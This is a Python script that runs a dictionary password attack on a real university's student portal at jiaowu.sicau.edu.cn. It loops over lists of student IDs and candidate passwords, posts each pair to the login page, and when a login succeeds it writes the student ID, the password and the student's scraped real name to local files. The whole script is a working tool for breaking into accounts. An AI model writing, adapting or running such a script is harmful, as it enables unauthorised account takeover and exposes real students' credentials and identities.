import requests
from lxml import etree
import datetime as d
import re


class Crack:
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) \
        Chrome/71.0.3578.98 Safari/537.36"}

    def get_sign(self):
        index = self.session.get('http://jiaowu.sicau.edu.cn/web/web/web/index.asp', timeout=5)
        index.encoding = 'gb2312'
        seletor = etree.HTML(index.text)
        return seletor.xpath("//input[@name='sign']/@value")

    def log_sicau(self, student_id, password):
        t = d.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        user_pwd = open('./user_pwd.txt', 'a+')
        log = open('./crack_pwd.log', 'a+')
        time_out = open('./time_out.txt', 'a+')
        try:
            data = {'user': student_id, 'pwd': password, 'lb': 'S', 'submit': '', 'sign': self.get_sign()}
            try:
                post_url = 'http://jiaowu.sicau.edu.cn/jiaoshi/bangong/check.asp'
                try:
                    self.session.post(post_url, data=data, timeout=5)
                    data = self.session.get('http://jiaowu.sicau.edu.cn/xuesheng/bangong/main/index1.asp',
                                            timeout=5)  # 跳转到个人主页
                except:
                    print(student_id, 'Connection_timed_out_2', t, file=log)
                    print(student_id, file=time_out)
                    print(student_id, 'Connection_timed_out_2')
                data.encoding = 'gb2312'
                name = re.compile('<td width="99" align="left">(.*)</td>').findall(data.text)  # 正则匹配你的名字
                print(student_id, password, name[1], file=user_pwd)
                print(student_id, password, name[1], t, file=log)
                print(student_id, password, name[1], t)
            except:
                print(student_id, 'wrong_password', t, file=log)
                print(student_id, password, 'wrong_password', t)
        except:
            print(student_id, 'Connection_timed_out_1', t, file=log)
            print(student_id, 'Connection_timed_out_1', t)
            print(student_id, file=time_out)


if __name__ == '__main__':
    crack = Crack()
    with open('./user_id', 'r') as r:
        user_set = r.readlines()
    with open('./pwd_dic', 'r') as r:
        pwd_set = r.readlines()
    for pwd in pwd_set:
        for i in user_set:
            user = i[0:-1]
            crack.log_sicau(user, pwd[:-1])
